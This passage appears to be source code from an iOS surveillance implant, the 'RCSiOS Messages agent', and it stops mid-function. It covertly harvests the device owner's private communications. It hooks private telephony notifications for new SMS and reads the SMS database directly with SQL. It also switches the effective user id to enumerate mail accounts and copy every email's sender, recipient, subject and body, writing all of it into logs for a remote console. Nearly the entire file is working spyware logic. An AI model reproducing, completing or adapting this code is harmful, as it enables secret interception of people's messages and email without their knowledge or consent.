/*
 * RCSiOS - Messages agent
 *
 *
 * Created by Massimo Chiodini on 01/10/2009
 * Copyright (C) HT srl 2009. All rights reserved
 *
 */
 
#import <unistd.h>
#import <pwd.h>
#import <sqlite3.h>
#import <objc/runtime.h>

#import "RCSIAgentMessages.h"
#import "RCSIUtils.h"

#ifdef __APPLE__
#include "TargetConditionals.h"
#endif

int seteuid(uid_t euid);

#define ANY_TYPE      0
#define SMS_TYPE      1
#define MMS_TYPE      2
#define MAIL_TYPE     4
#define IN_SMS        2
#define OUT_SMS       3

#define SMS_DB_SIMULATOR "/tmp/sms.db"
#define SMS_DB_IPHONE_OS "/var/mobile/Library/SMS/sms.db"

typedef struct _logMessageHeader {
#define STRING_FROM     0x03
#define STRING_TO       0x04
#define STRING_SUBJECT  0x07
#define OBJECT_MIMEBODY 0x80
#define OBJECT_TEXTBODY 0x84
#define MAPI_V1_0_PROTO 0x01000000
  u_int dwSize;               // size of serialized message (this struct + class/from/to/subject + message body + attachs)
  u_int VersionFlags;         // flags for parsing serialized message
  u_int Status;               // message status
  u_int Flags;                // message flags
  u_int Size;                 // message size
  u_int DeliveryTimeLow;      // delivery time of message (maybe null)
  u_int DeliveryTimeHi;       //
  u_int nAttachs;             // number of attachments
} logMessageHeader;

//#define DEBUG

int dummy_f()
{
  return 1;
}

// PrivateFrameworks...
extern  CFStringRef     kCTMessageReceivedNotification;
extern  NSString* const kCTMessageIdKey;
extern  NSString* const kCTMessageTypeKey;


id      CTTelephonyCenterGetDefault();
void    CTTelephonyCenterAddObserver(id center,
                                    const void *observer,
                                    CFNotificationCallback callBack,
                                    CFStringRef name,
                                    const void *object,
                                    CFNotificationSuspensionBehavior suspensionBehavior);
// undocumented
void    CTTelephonyCenterRemoveObserver(id center,
                                        const void *observer,
                                        CFStringRef name,
                                        const void *object);

// undocumented
NSString *CTSettingCopyMyPhoneNumber();

// CT Notification callback
static void MsgNotificationCallback (CFNotificationCenterRef center, 
                                     void *observer, 
                                     CFStringRef name, 
                                     const void *object, 
                                     CFDictionaryRef userInfo) 
{  
  NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
  
  _i_AgentMessages *agentMsg = (_i_AgentMessages *) observer;

#ifdef DEBUG  
  NSLog(@"SmsNotificationCallback: notification received %@ with observer %@ and object %@.", 
        name, [(NSObject *)observer class], [(NSObject *)object class]);
#endif
  
  if (!userInfo) 
    {
      [pool release];
      return;
    }
  
  id typeValue = [(NSDictionary *) userInfo objectForKey: kCTMessageTypeKey];
  
#ifdef DEBUG   
  id idValue = [(NSDictionary *)userInfo objectForKey: kCTMessageIdKey];  
  NSLog(@"SmsNotificationCallback: messageIdK = %@ messageType %@.", idValue, typeValue); 
#endif  
  
  if ([typeValue intValue] == SMS_TYPE) 
    {
    @synchronized(agentMsg)
      {
        // add event to semaphore
        agentMsg->mSMS++;
#ifdef DEBUG
        NSLog(@"SmsNotificationCallback: semaphore on sms = %d", agentMsg->mSMS);
#endif      
      }
    }
  
  [pool release];
  
  return; 
}


@interface _i_AgentMessages (hidden)

- (BOOL)_parseConfWithData: (id)rawData;
- (BOOL)_getMessagesWithFilter: (int)filter andMessageType: (int)msgType;
- (BOOL)_writeMessages: (NSDictionary *)anObject
           withLogType: (int)logType;
- (BOOL)_getAgentMessagesProperty;
- (BOOL)_setAgentMessagesProperty;
- (BOOL)_smsWithKeyWords: (NSArray *)keyWords 
              withFilter: (int)msgFilter 
                fromDate: (long)fromDate 
                  toDate: (long)toDate;
- (BOOL)_mailWithMessageSize: (long)maxMsgSize
                  withFilter: (int)msgFilter 
                    fromDate: (long)fromDate 
                      toDate: (long)toDate;
- (NSMutableArray*)_mailMessageAccount;
- (NSMutableArray*)_mailMessagesForAccount: (id)account;

@end

@implementation _i_AgentMessages (hidden)

- (BOOL)_setAgentMessagesProperty
{
  NSAutoreleasePool *pool   = [[NSAutoreleasePool alloc] init];
  
  //SMS
  NSDictionary *smsRealTime = [[NSDictionary alloc] initWithObjects: [NSArray arrayWithObjects: [NSNumber numberWithLong: 0], [NSNumber numberWithLong: mLastRealTimeSMS], nil] 
                                                            forKeys: [NSArray arrayWithObjects: @"fromDateTime", @"toDateTime", nil]];
  
  NSDictionary *smsClltTime = [[NSDictionary alloc] initWithObjects: [NSArray arrayWithObjects: [NSNumber numberWithLong: mFirstCollectorSMS], [NSNumber numberWithLong: mLastCollectorSMS], nil]
                                                            forKeys: [NSArray arrayWithObjects:  @"fromDateTime", @"toDateTime", nil]  ];
  
  NSDictionary *smsCllt     = [[NSDictionary alloc] initWithObjects: [NSArray arrayWithObjects: smsClltTime, nil]
                                                            forKeys: [NSArray arrayWithObjects: @"COLLECT_FILTER_TYPE", nil]];
  
  NSDictionary *smsReal     = [[NSDictionary alloc] initWithObjects: [NSArray arrayWithObjects: smsRealTime, nil]
                                                            forKeys: [NSArray arrayWithObjects: @"REALTTIME_FILTER_TYPE", nil]];
  
  NSArray      *smsArray    = [NSArray arrayWithObjects: smsCllt, smsReal, nil];
 
  // MAIL
  NSDictionary *mailRealTime = [[NSDictionary alloc] initWithObjects: [NSArray arrayWithObjects: [NSNumber numberWithLong: 0], [NSNumber numberWithLong: mLastRealTimeMail], nil] 
                                                             forKeys: [NSArray arrayWithObjects: @"fromDateTime", @"toDateTime", nil]];
  
  NSDictionary *mailClltTime = [[NSDictionary alloc] initWithObjects: [NSArray arrayWithObjects: [NSNumber numberWithLong: mFirstCollectorMail], [NSNumber numberWithLong: mLastCollectorMail], nil]
                                                             forKeys: [NSArray arrayWithObjects:  @"fromDateTime", @"toDateTime", nil]  ];
  
  NSDictionary *mailCllt     = [[NSDictionary alloc] initWithObjects: [NSArray arrayWithObjects: mailClltTime, nil]
                                                             forKeys: [NSArray arrayWithObjects: @"COLLECT_FILTER_TYPE", nil]];
  
  NSDictionary *mailReal     = [[NSDictionary alloc] initWithObjects: [NSArray arrayWithObjects: mailRealTime, nil]
                                                            forKeys: [NSArray arrayWithObjects: @"REALTTIME_FILTER_TYPE", nil]];
  
  NSArray      *mailArray    = [NSArray arrayWithObjects: mailCllt, mailReal, nil];  
  
  // add dictionary MAIL, SMS...
  NSDictionary *smsDict     = [[NSDictionary alloc] initWithObjects: [NSArray arrayWithObjects: smsArray, mailArray, nil] 
                                                            forKeys: [NSArray arrayWithObjects: @"SMS", @"MAIL", nil]];
  
//  NSDictionary *agentDict   = [[NSDictionary alloc] initWithObjects: [NSArray arrayWithObjects: smsDict, nil]
//                                                            forKeys: [NSArray arrayWithObjects: [[self class] description], nil]];
  
  //setRcsPropertyWithName([[self class] description], agentDict);
  [[_i_Utils sharedInstance] setPropertyWithName:[[self class] description]
                                  withDictionary:smsDict];
  
//  [agentDict release];
  [smsDict release];
  [smsReal release];
  [smsCllt release];
  [smsClltTime release];
  [smsRealTime release];
  
  [mailReal release];
  [mailCllt release];
  [mailClltTime release];
  [mailRealTime release];
  
  [pool release];
  
  return YES;
}

- (BOOL)_getAgentMessagesProperty
{
  NSDictionary *agentDict = nil;
  NSDictionary *dict = nil;
  NSDictionary *dateTime = nil;
  
  NSAutoreleasePool *outerPool = [[NSAutoreleasePool alloc] init];
  
  //agentDict = rcsPropertyWithName([[self class] description]);
  agentDict = [[_i_Utils sharedInstance] getPropertyWithName:[[self class] description]];
  
  if (agentDict == nil) 
    {
      [outerPool release];
      return YES;
    }
  
  // SMS
  NSArray *filterArray = [agentDict objectForKey: @"SMS"];

  for (int i=0; i<[filterArray count]; i++) 
    {
      NSAutoreleasePool *innerPool = [[NSAutoreleasePool alloc] init];
    
      dict = (NSDictionary *) [filterArray objectAtIndex: i];
    
      dateTime = [dict objectForKey: @"COLLECT_FILTER_TYPE"];
    
      if (dateTime != nil) 
        {
          mLastCollectorSMS  = [[dateTime objectForKey: @"toDateTime"] longValue];
          mFirstCollectorSMS = [[dateTime objectForKey: @"fromDateTime"] longValue];
        }
      else 
        {
          dateTime = [dict objectForKey: @"REALTTIME_FILTER_TYPE"];
          if (dateTime != nil) 
              mLastRealTimeSMS  = [[dateTime objectForKey: @"toDateTime"] longValue];
        }
    
      [innerPool release];
    }
  
  // MAIL
  NSArray *filterMailArray = [agentDict objectForKey: @"MAIL"];
  
  if (filterMailArray != nil) 
    { 
      for (int i=0; i<[filterMailArray count]; i++) 
        {
          NSAutoreleasePool *innerPool = [[NSAutoreleasePool alloc] init];
          
          dict = (NSDictionary *) [filterMailArray objectAtIndex: i];
          
          dateTime = [dict objectForKey: @"COLLECT_FILTER_TYPE"];
          
          if (dateTime != nil) 
            {
              mLastCollectorMail  = [[dateTime objectForKey: @"toDateTime"] longValue];
              mFirstCollectorMail = [[dateTime objectForKey: @"fromDateTime"] longValue];
            }
          else 
            {
              dateTime = [dict objectForKey: @"REALTTIME_FILTER_TYPE"];
              if (dateTime != nil) 
                mLastRealTimeMail  = [[dateTime objectForKey: @"toDateTime"] longValue];
            }
          
          [innerPool release];
        }
    }
   
  [agentDict release];
  
  [outerPool release];
  
  return YES;
}

- (NSMutableArray*)_mailMessageAccount
{
  // fix for iOS4
  //struct passwd  *ePasswd;
  int            i = 0, cnt, eUid;
  NSMutableArray *actArray =nil;
  
  // Current euser id
  eUid = geteuid();
  
  // Get uid for query mobile user AddressBook
  // ePasswd = getpwnam("mobile");
  
//  if (ePasswd == NULL) 
//    {
//#ifdef DEBUG
//      NSLog(@"%s: error get uid for mobile users", __FUNCTION__);
//#endif
//      return nil;
//    }
  
  // Setting the id and run the query
  if( seteuid(501/*ePasswd->pw_uid*/) < 0)
    {
#ifdef DEBUG
      NSLog(@"%s: cannot seteuid from mobile user", __FUNCTION__);
#endif
      //free(ePasswd);
      return nil;
    }
  
  id MailAccountClass = nil;
  
  MailAccountClass = objc_getClass("MailAccount");
  
  if (MailAccountClass != nil) 
    {
      if ([MailAccountClass respondsToSelector: @selector(activeAccounts)]) 
        {
          actArray = [[MailAccountClass performSelector: @selector(activeAccounts)] mutableCopy];
        }
    }

  if (actArray == nil)
    {
#ifdef DEBUG
      NSLog(@"%s: account for mobile not found", __FUNCTION__);
#endif
      return nil;
    }
  
#ifdef DEBUG
  NSLog(@"%s: account for mobile %@", __FUNCTION__, actArray);
#endif
  
  // Reverting the privs
  if( seteuid(eUid) < 0)
    {
#ifdef DEBUG
      NSLog(@"%s: cannot revert uid for prev users", __FUNCTION__);
#endif
      //free(ePasswd);
      return 0;
    }

  cnt = [actArray count];
  
  Class lcClass = objc_getClass("LocalAccount");
  
  while (i != cnt) 
    {
      id act = [actArray objectAtIndex: i];

      if ([act isKindOfClass: lcClass]) 
        {
          [actArray removeObjectAtIndex: i];
          return [actArray autorelease];
        }
    
      i++;
    }
  
  return [actArray autorelease];
}

- (NSMutableArray*)_mailMessagesForAccount: (id)account
{
  NSArray         *mbUidArray;
  id              uid;
  id              str;
  NSMutableArray  *msgArray, *tmpMsgArray;
  
  NSAutoreleasePool *outer = [[NSAutoreleasePool alloc] init];
  
  msgArray = [[NSMutableArray alloc] initWithCapacity: 0];
  
  if ([account respondsToSelector:@selector(allMailboxUids)]) 
    {
      mbUidArray = [account performSelector: @selector(allMailboxUids)];
    }
  
#ifdef DEBUG
  NSLog(@"%s: account mailboxes %@", __FUNCTION__, mbUidArray);
#endif
  
  if (mbUidArray == nil) 
    {
#ifdef DEBUG
    NSLog(@"%s: account no mailboxes", __FUNCTION__);
#endif
      [msgArray release];
      [outer release];
      return nil;
  }
  
  for (int i=0; i < [mbUidArray count]; i++) 
    {
      NSAutoreleasePool *inner = [[NSAutoreleasePool alloc] init];
    
      uid = [mbUidArray objectAtIndex: i];
    
      if ([uid respondsToSelector: @selector(store)]) 
        {
          str = [uid performSelector: @selector(store)];
        }
    
      if (str != nil && 
          [str respondsToSelector: @selector(copyOfAllMessages)])
        {
          tmpMsgArray = [str performSelector: @selector(copyOfAllMessages)];
        }
    
#ifdef DEBUG
    NSLog(@"%s: mailbox messages no. %d", __FUNCTION__, [tmpMsgArray count]);
#endif

      if (tmpMsgArray != nil)
        [msgArray addObjectsFromArray: tmpMsgArray];
    
      [inner release];
      
    }
  
  [outer release];
  
  if ([msgArray count]) 
    {
#ifdef DEBUG
      NSLog(@"%s: return %d messages", __FUNCTION__, [msgArray count]);
#endif
      return msgArray;
    }
  else 
    {
      [msgArray release];
      return nil;
    }
}

- (BOOL)_mailWithMessageSize: (long)maxMsgSize 
                  withFilter: (int)msgFilter 
                    fromDate: (long)fromDate 
                      toDate: (long)toDate
{
  NSString  *body;
  NSString  *from;
  NSString  *to;
  NSString  *subject;
  time_t    unixTime;
  long      maxDate;
  
  NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];

  if (toDate == ALL_MSG) 
    maxDate = LONG_MAX;
  else 
    maxDate = toDate;

#ifdef DEBUG
  int total_body = 0;
  //NSLog(@"%s: running fetcher", __FUNCTION__);
#endif 
  
  // Get all active account
  NSArray *actArray = [self _mailMessageAccount];
  
  if (actArray == nil) 
    {
#ifdef DEBUG
      NSLog(@"%s: account for mobile not found", __FUNCTION__);
#endif
      return NO;
    }
  
#ifdef DEBUG
  NSLog(@"%s: num of account %d", __FUNCTION__, [actArray count]);
#endif
  
  for (int actCount=0; actCount < [actArray count]; actCount++) 
    {
      NSAutoreleasePool *outerPool = [[NSAutoreleasePool alloc] init];
    
      // get all messages from active account
      NSMutableArray *msgArray = [self _mailMessagesForAccount: [actArray objectAtIndex: actCount]];

      if (msgArray == nil) 
        {
#ifdef DEBUG
        NSLog(@"%s: account no messages", 
              __FUNCTION__);//, [[actArray objectAtIndex: actCount] displayName]);
#endif
          [outerPool release];
          continue;
        }
    
#ifdef DEBUG
      NSLog(@"%s: account num of messages %d", 
            __FUNCTION__, [msgArray count]);// [[actArray objectAtIndex: actCount] displayName], [msgArray count]);
#endif
    
      for (int i=0; i < [msgArray count] ; i++) 
        {
          NSAutoreleasePool *innerPool = [[NSAutoreleasePool alloc] init];
        
          id msg = [msgArray objectAtIndex: i];
          
          unixTime = 0;
        
          if ([msg respondsToSelector: @selector(dateReceived)]) 
            unixTime = [[msg performSelector: @selector(dateReceived)] timeIntervalSince1970]; 
        
#ifdef DEBUG
          NSDate *mx = [NSDate dateWithTimeIntervalSince1970: maxDate];
          NSLog(@"%s: filter by date unixtime (%d) maxDate %@ (%d) ", 
              __FUNCTION__, unixTime,
              mx, maxDate);
#endif
          // filter on message
          int tempSize = 0;
          
          if ([msg respondsToSelector: @selector(messageSize)])
            {
              //tempSize = (int)[msg performSelector: @selector(messageSize)];
              NSMethodSignature *sigSize = [[msg class] instanceMethodSignatureForSelector: @selector(messageSize)];
              NSInvocation *invSize = [NSInvocation invocationWithMethodSignature: sigSize];
              [invSize setTarget: msg];
              [invSize setSelector: @selector(messageSize)];
              [invSize invoke];
              [invSize getReturnValue: &tempSize];
#ifdef DEBUG
              NSLog(@"%s: message size (%d) ", __FUNCTION__,tempSize);
#endif 
            }

        
          if ((maxMsgSize > 0 && tempSize > maxMsgSize) ||
              !(unixTime > fromDate && unixTime < maxDate)) 
            {
              [innerPool release];
              continue;
            }
      
//          BOOL isLocal = NO, isNotComplete = NO;
        
//#ifdef DEBUG
//          NSLog(@"%s: local ", __FUNCTION__);
//#endif
//        
//          if ([msg respondsToSelector: @selector(isMessageContentsLocallyAvailable)]) 
//            {
//              //isLocal = [[msg performSelector: @selector(isMessageContentsLocallyAvailable)] boolValue];
//              NSMethodSignature *sigLoc = [[msg class] instanceMethodSignatureForSelector: @selector(isMessageContentsLocallyAvailable)];
//              NSInvocation *invLoc = [NSInvocation invocationWithMethodSignature: sigLoc];
//              [invLoc setTarget: msg];
//              [invLoc setSelector: @selector(isMessageContentsLocallyAvailable)];
//              [invLoc invoke];
//              [invLoc getReturnValue: &isLocal];
//#ifdef DEBUG
//              NSLog(@"%s: is local (%d) ", __FUNCTION__, isLocal);
//#endif 
//            }
        
//#ifdef DEBUG
//          NSLog(@"%s: partial ", __FUNCTION__);
//#endif
//          if ([msg respondsToSelector: @selector(isPartial)]) 
//            {
//              //isNotComplete = [[msg performSelector: @selector(isPartial)] boolValue];
//              NSMethodSignature *sigPar = [[msg class] instanceMethodSignatureForSelector: @selector(isPartial)];
//              NSInvocation *invPar = [NSInvocation invocationWithMethodSignature: sigPar];
//              [invPar setTarget: msg];
//              [invPar setSelector: @selector(isPartial)];
//              [invPar invoke];
//              [invPar getReturnValue: &isNotComplete];
//#ifdef DEBUG
//              NSLog(@"%s: is complete (%d) ", __FUNCTION__, isNotComplete);
//#endif 
//            }
        
#ifdef DEBUG
          NSLog(@"%s: message date (%d) ", 
                  __FUNCTION__, unixTime);
#endif

//#ifdef DEBUG
//          NSLog(@"%s: messageDataIsComplete ", __FUNCTION__);
//#endif         

//          if ([msg respondsToSelector: @selector(messageDataIsComplete:downloadIfNecessary:)])
//              bodyData = [msg performSelector: @selector(messageDataIsComplete:downloadIfNecessary:)
//                                   withObject: NULL 
//                                   withObject: NO];
        
#ifdef DEBUG
          NSLog(@"%s: sender", __FUNCTION__);
#endif
          if ([msg respondsToSelector: @selector(sender)]) 
            {
              from = [NSString stringWithString: [msg performSelector: @selector(sender)]];
              if (from == nil) 
                from = [[NSString alloc] initWithString: @""];
            }
        
#ifdef DEBUG
          NSLog(@"%s: to", __FUNCTION__);
#endif
          if ([msg respondsToSelector: @selector(to)]) 
            {
              to = [msg performSelector: @selector(to)];
              if (to == nil) 
                to = [[NSString alloc] initWithString: @""];
            }
        
#ifdef DEBUG
          NSLog(@"%s: subject ", __FUNCTION__);
#endif
        
          if ([msg respondsToSelector: @selector(subject)]) 
            {
              subject = [NSString stringWithString: [msg performSelector: @selector(subject)]];
              if (subject == nil) 
                subject = [[NSString alloc] initWithString: @""];
            }
        
          // Message body
          NSData *bodyData = nil;

          // optional only if in cache
          if ([msg respondsToSelector: @selector(messageBody)]) 
            {
              id mimeBody = [msg performSelector: @selector(messageBody)];
          
              if ([mimeBody respondsToSelector: @selector(isHTML)] &&
                  [mimeBody performSelector: @selector(isHTML)]) 
                {
#ifdef DEBUG
                  NSLog(@"%s: retriving html content of body", __FUNCTION__);
#endif
                  if ([mimeBody respondsToSelector: @selector(htmlContent)]) 
                    {
                      id webMessageDocuments = [mimeBody performSelector: @selector(htmlContent)];
#ifdef DEBUG
                      NSLog(@"%s: webMessageDocuments class %@", __FUNCTION__, 
                            [webMessageDocuments class]);
#endif
                      if (webMessageDocuments != nil &&
                          [(NSArray*)webMessageDocuments count]) 
                        {
#ifdef DEBUG
                          NSLog(@"%s: webMessageDocuments = %d", __FUNCTION__, 
                                [(NSArray*)webMessageDocuments count]);
#endif
                          id webMessageDocument = [(NSArray*)webMessageDocuments objectAtIndex: 0];

                          if ([webMessageDocument respondsToSelector: @selector(htmlData)])
                            {
                              bodyData = [webMessageDocument performSelector: @selector(htmlData)];
#ifdef DEBUG
//                              NSLog(@"%s: msg %x mimeBody %x webMessageDocument %x", __FUNCTION__,
//                                    msg, mimeBody, webMessageDocument);
//                              int ddd = dummy_f();
                              total_body++;
#endif
                            }
                        }
                    }
                }
              else
                {

                  if ([mimeBody respondsToSelector: @selector(rawData)])
                    {
                      bodyData = [mimeBody performSelector: @selector(rawData)];
#ifdef DEBUG
                      NSLog(@"%s: retriving raw content of body len = %d", 
                            __FUNCTION__, [bodyData length]);
#endif                 
                    }
                }
          
              
            }
        
          //bodyData = [msg performSelector: @selector(bodyData)];
          if (bodyData == nil) 
            {
#ifdef DEBUG
              NSLog(@"%s: NO body......", __FUNCTION__);
#endif 
              body = [[NSString alloc] initWithString: @""];
            }
          else 
            {
              NSString *bodyUTF8, *bodyLat1;
            
              bodyUTF8 = [[NSString alloc] initWithBytes: [bodyData bytes]
                                                  length: [bodyData length]
                                                encoding: NSUTF8StringEncoding];
              if (bodyUTF8 != nil)
                body = bodyUTF8;
              else 
                {
                  bodyLat1 = [[NSString alloc] initWithBytes: [bodyData bytes]
                                                    length: [bodyData length]
                                                  encoding: NSISOLatin1StringEncoding];
                  if (bodyLat1 != nil)
                    body = bodyLat1;
                }
           
              if (body == nil) 
                {
                  body = [[NSString alloc] initWithString: @""];
#ifdef DEBUG
                  total_body--;
                  NSString *tmpName = [[NSString alloc] initWithFormat: @"/tmp/pippo-%d.html", total_body];
                  [bodyData writeToFile: tmpName
                             atomically: YES];
                  [tmpName release];
#endif 
                }
              else 
                {
#ifdef DEBUG
                  NSLog(@"%s: UTF16 body len = %d", __FUNCTION__,
                        [body lengthOfBytesUsingEncoding: NSUTF16LittleEndianStringEncoding]);
                  NSString *tmpName = [[NSString alloc] initWithFormat: @"/tmp/pippo-%d.html", total_body];
                  [bodyData writeToFile: tmpName
                             atomically: YES];
                  [tmpName release];
#endif 
                }
              
              

            }
        
          // unixtime to filetime for datetime_field
          int64_t  filetime = ((int64_t)unixTime * (int64_t)RATE_DIFF) + (int64_t)EPOCH_DIFF;
          NSNumber *deliveryUnixTime = [[NSNumber alloc] initWithLong: unixTime];
          NSNumber *deliveryTimeHi   = [[NSNumber alloc] initWithLong: filetime >> 32];
          NSNumber *deliveryTimeLow  = [[NSNumber alloc] initWithLong: filetime & 0xFFFFFFFF];
          
          NSNumber *messageType      = [[NSNumber alloc] initWithInt: MAIL_TYPE];
          NSNumber *messageFilter    = [[NSNumber alloc] initWithInt: msgFilter];
          
          NSArray *keys    = [NSArray arrayWithObjects: @"unixTime",
                              @"datetimeHi",
                              @"datetimeLow",
                              @"type",
                              @"filter",
                              @"subject",
                              @"from",
                              @"to",
                              @"body",
                              nil];
        
          NSArray *objects = [NSArray arrayWithObjects: deliveryUnixTime,
                              deliveryTimeHi,
                              deliveryTimeLow,
                              messageType,
                              messageFilter,
                              subject,
                              from,
                              to,
                              body,
                              nil];
          
          NSDictionary *dictionary = [NSDictionary dictionaryWithObjects: objects
                                                                 forKeys: keys];
            
#ifdef DEBUG
          {
            NSDate *r = [NSDate dateWithTimeIntervalSince1970: mLastRealTimeMail];
            NSLog(@"%s:before update mLastRealTimeMail %@ (%d)", 
                  __FUNCTION__, r, mLastRealTimeMail);
          };
#endif
              if (mLastRealTimeMail < unixTime)
                mLastRealTimeMail  = unixTime;
 
#ifdef DEBUG
          {
            NSDate *r = [NSDate dateWithTimeIntervalSince1970: mLastRealTimeMail];
            NSLog(@"%s:after update mLastRealTimeMail %@ (%d)", 
                  __FUNCTION__, r, mLastRealTimeMail);
          };
#endif
            
#ifdef DEBUG
          NSLog(@"%s: save message %@", __FUNCTION__, dictionary);
#endif
            
          // Write it down...
          // Here we're saving the plist
          [self _writeMessages: dictionary withLogType: LOG_MAIL];
          
          [deliveryUnixTime release];
          [deliveryTimeHi release];
          [deliveryTimeLow release];
          [messageType release];
          [messageFilter release];
          [body release];
          
          [innerPool release];
        }
      
      [msgArray release];
    
      [outerPool release];
    } 

  [pool release];
  
#ifdef DEBUG
  NSLog(@"%s: saved message with body %d", __FUNCTION__, total_body);
#endif
  
  return YES;
}

- (BOOL)_smsWithKeyWords: (NSArray *)keyWords
              withFilter: (int)msgFilter 
                fromDate: (long)fromDate 
                  toDate: (long)toDate
{
  int           i = 0;
  char          sql_query_curr[1024];
  int           ret, nrow = 0, ncol = 0, flags = 0;
  char          *szErr;
  char          **result;
  sqlite3       *db;
  NSString      *from;
  NSString      *subject;
  NSString      *to;
  time_t        unixTime,curr_rowid;
  char          sql_query_all_ios3[] = "select date,address,text,flags,ROWID from message";
  char          sql_query_all_ios6[] = "select message.date,chat.chat_identifier, message.text, message.is_from_me,message.rowid from message inner join chat_message_join on chat_message_join.message_id = message.rowid inner join chat on chat_message_join.chat_id = chat.rowid";
  char          sql_db_name[] = SMS_DB_IPHONE_OS;
  char          *sql_query_all = sql_query_all_ios3;

  NSRange range;
  BOOL bFound = YES;
  
  if (gOSMajor >= 6)
    sql_query_all = sql_query_all_ios6;

  if (msgFilter == COLLECT_FILTER_TYPE) 
    {
      // Setting last sms datetime
      if (fromDate > ALL_MSG)
        {
          long _fdate = fromDate;
          long _todate = toDate;
          
          if (gOSMajor >= 6 && fromDate > 0)
            _fdate -= NSTimeIntervalSince1970;
          if (gOSMajor >= 6 && toDate > 0)
            _todate -= NSTimeIntervalSince1970;
          
          sprintf(sql_query_curr, "%s where message.date >= %ld", sql_query_all, _fdate);
          if (toDate > ALL_MSG)
            sprintf(sql_query_curr, "%s and message.date < %ld", sql_query_curr, _todate);
        }
      else 
        sprintf(sql_query_curr, "%s", sql_query_all);
    }
  else 
    {
      //sprintf(sql_query_curr, "select date,address,text,flags,ROWID from message where ROWID > %ld", fromDate);
      sprintf(sql_query_curr, "%s where message.ROWID > %ld", sql_query_all, fromDate);
    }
 
  if (sqlite3_open(sql_db_name, &db))
    {
      sqlite3_close(db);
      return NO;
    }
  
  // running the query
  ret = sqlite3_get_table(db, sql_query_curr, &result, &nrow, &ncol, &szErr);
 
  // Close as soon as possible
  sqlite3_close(db);
  
  if (ret != SQLITE_OK)
    {
      return NO;
    }
  
  // Only if we got some msg...
  if (ncol * nrow > 0)
    {
      for (i = 0; i< nrow * ncol; i += 5)
        {
          NSAutoreleasePool *innerPool = [[NSAutoreleasePool alloc] init];
    
          // Body of the sms: will be encapsed in the sujbect_field
          
          char *__subject = result[ncol + i + 2] == NULL ? " " : result[ncol + i + 2];
          
          subject = [NSString stringWithUTF8String:__subject];
        
          // if no keyWords the matching must be true
          bFound = YES;
          range.location = 0;
          range.length = [subject lengthOfBytesUsingEncoding: NSUTF8StringEncoding];
          
          // Loop on keyWors array
          for (int i=0; i<[keyWords count]; i++) 
            {
              // Resetting found status 
              bFound = NO;
              
              NSString *key = (NSString *)[keyWords objectAtIndex: i];
              
              NSRange found = [subject rangeOfString: key 
                                             options: NSCaseInsensitiveSearch 
                                               range: range 
                                              locale: nil];
            
            if (found.location == NSNotFound) 
                continue;
              else 
                { 
                  bFound = YES;
                  break;
                }
            }
          
          // message timestamp (date_field)
          char *__curr_rowid = result[ncol + i + 4] == NULL ? "0" : result[ncol + i + 4];
          char *__unixTime   = result[ncol + i] == NULL ? "0" : result[ncol + i];
          
          sscanf(__curr_rowid, "%ld", (long*)&curr_rowid);
          sscanf(__unixTime, "%ld", (long*)&unixTime);
          
          // Syncronize and update prop var...
          if (msgFilter == COLLECT_FILTER_TYPE) 
            {
              // mLastCollectorSMS = unixTime;
              // last real time date not set yet: 
              //   we force it to current last messate datetime
              // XXX No more: we have lastCollector date on console now!
              if (mLastRealTimeSMS < curr_rowid) 
                {
                  mLastRealTimeSMS = curr_rowid;
                }
            }
          else
            {
              // One message queue processed...
              if (mLastRealTimeSMS < curr_rowid) 
                {
                  mLastRealTimeSMS = curr_rowid;
                }
              //mLastRealTimeSMS  = unixTime;        
              @synchronized(self)
                {
                  if (mSMS > 0)
                    mSMS--;
                }
            }
               
          // keyWords not matching... processing next message
          if (bFound == NO) 
            { 
              [innerPool release];
              continue;
            }
        
          // flags == 2 -> in mesg; flags == 3 -> out mesg
          flags = 0;
          char *__flags = result[ncol + i + 3] == NULL ? "0" : result[ncol + i + 3];
          
          sscanf(__flags, "%d", &flags);
   
          flags &= 0x1;
          
          switch (flags)
          {
            case IN_SMS:
            case 0:
            {
              if (result[ncol + i + 1] != NULL)
                from = [NSString stringWithCString: result[ncol + i + 1] encoding: NSUTF8StringEncoding];
              else
                from = [NSString stringWithCString: "" encoding: NSUTF8StringEncoding];
              
              // undocumented
              to   = CTSettingCopyMyPhoneNumber();
              // not set
              if (to == nil)
                to = [NSString stringWithCString: "local" encoding: NSUTF8StringEncoding];
              break;
            }
            case OUT_SMS:
            case 1:
            {
              if (result[ncol + i + 1] != NULL)
                to = [NSString stringWithCString: result[ncol + i + 1] encoding: NSUTF8StringEncoding];
              else
                to = [NSString stringWithCString: "" encoding: NSUTF8StringEncoding];
              
              // undocumented
              from = CTSettingCopyMyPhoneNumber();
              // not set
              if (from == nil)
                from = [NSString stringWithCString: "local" encoding: NSUTF8StringEncoding];
              
              break;
            }
            default:
              break;
          }
          
          // unixtime to filetime for datetime_field
          int64_t  filetime = ((int64_t)unixTime * (int64_t)RATE_DIFF) + (int64_t)EPOCH_DIFF;
          NSNumber *deliveryUnixTime = [[NSNumber alloc] initWithLong: unixTime];
          NSNumber *deliveryTimeHi   = [[NSNumber alloc] initWithLong: filetime >> 32];
          NSNumber *deliveryTimeLow  = [[NSNumber alloc] initWithLong: filetime & 0xFFFFFFFF];
        
          NSNumber *messageType      = [[NSNumber alloc] initWithInt: SMS_TYPE];
          NSNumber *messageFilter    = [[NSNumber alloc] initWithInt: msgFilter];
        
          NSArray *keys    = [NSArray arrayWithObjects: @"unixTime",
                                                        @"datetimeHi",
                                                        @"datetimeLow",
                                                        @"type",
                                                        @"filter",
                                                        @"from",
                                                        @"to",
                                                        @"subject",
                                                        nil];
          NSArray *objects = [NSArray arrayWithObjects: deliveryUnixTime,
                                                        deliveryTimeHi,
                                                        deliveryTimeLow,
                                                        messageType,
                                                        messageFilter,
                                                        from    != nil ? from : @"",
                                                        to      != nil ? to : @"",
                                                        subject != nil ? subject : @"",
                                                        nil];
          
          NSDictionary *dictionary = [NSDictionary dictionaryWithObjects: objects
                                                                 forKeys: keys];
        
          // Write it down...
          // Here we save the plist
          [self _writeMessages: dictionary withLogType: LOG_SMS];
          
          [deliveryUnixTime release];
          [deliveryTimeHi release];
          [deliveryTimeLow release];
          [messageType release];
          [messageFilter release];
          
          [innerPool release];  
        }
      
      // free result table
      sqlite3_free_table(result);
      
      return YES;
    }
  else
    {
      return NO;
    }
}

- (BOOL)_getMessagesWithFilter: (int)msgFilter andMessageType: (int)msgType
{
  id             anObject;
  NSEnumerator   *enumeratorCfg;
  
  NSAutoreleasePool *outerPool = [[NSAutoreleasePool alloc] init];

  
